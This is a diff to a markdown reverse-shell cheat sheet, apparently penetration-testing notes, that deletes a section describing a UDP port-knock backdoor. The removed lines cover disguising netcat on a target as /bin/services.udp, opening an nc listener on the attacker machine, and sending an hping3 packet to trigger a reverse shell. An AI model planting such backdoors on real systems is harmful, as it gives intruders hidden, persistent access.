@@ -19,18 +19,6 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
 [Security Online](https://securityonline.info/icmpsh-simple-reverse-icmp-shell/)
 
-# Xinetd UDP Portknock Backdoor
-##### [On Target, create xinetd service](https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56)
-It requires that netcat is on the target, in the /bin directory.  It copies netcat to file /bin/services.udp.
-##### Start netcat listener on Attack machine
-```bash
-nc -lnvp <Port #>
-```
-##### Send a single UDP packet to target, "knocking," and causing the target to establish a reverse shell.
-```bash
-hping3 -2 -c 1 <Target IP Address> -p 65534
-```
-
 # References
 [HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 
